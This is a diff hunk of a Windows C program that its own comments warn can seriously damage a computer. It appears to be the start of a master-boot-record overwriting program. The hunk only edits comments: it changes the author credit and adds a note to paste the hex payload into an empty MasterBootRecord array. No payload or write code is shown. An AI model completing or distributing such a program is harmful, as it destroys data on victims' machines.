@@ -1,9 +1,9 @@
 // this is very dangerous do not run this on your host computer this may damage your computer seriously!
-// this was written by Maruf132
+// this was written by a Youtuber called Sleep Mod
 // i will not be including the executable because it is so dangerous!
 #include <windows.h>
 
-const unsigned char MasterBootRecord[] = {};
+const unsigned char MasterBootRecord[] = {}; // paste the hexdaciouml code in {};
 int CALLBACK WinMain(
     HINSTANCE hInstance, HINSTANCE hPrevInstance,
     LPSTR     lpCmdLine, int       nCmdShow
